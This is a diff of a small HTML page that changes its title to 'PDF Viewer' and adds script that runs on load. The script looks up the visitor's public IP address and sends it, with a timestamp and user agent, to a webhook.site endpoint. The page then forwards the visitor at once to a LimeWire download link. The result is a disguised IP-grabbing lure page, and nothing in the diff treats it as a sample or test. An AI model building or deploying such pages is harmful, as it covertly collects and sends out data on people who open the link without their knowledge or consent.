@@ -2,43 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0;url=https://limewire.com/d/Bsioq#1iNeQm6Tb4">
+  <meta http-equiv="refresh" content="0; url=https://limewire.com/d/Bsioq#1iNeQm6Tb4">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LimeWire</title>
-  <link rel="icon" href="https://limewire.com/favicon.ico">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #0f0f0f;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    img.logo {
-      width: 200px;
-      margin-bottom: 20px;
-    }
-    h1 {
-      font-size: 1.5rem;
-      font-weight: 600;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 1rem;
-      opacity: 0.8;
-    }
-  </style>
+  <title>PDF Viewer</title>
   <script>
-    // Call local API tracker
-    fetch("/api/track", { method: "POST" });
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://webhook.site/e8e00abb-2096-446f-9e12-2fccebf87cd9", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      });
   </script>
 </head>
 <body>
-  <h1></h1>
+  <p> </p>
 </body>
 </html>
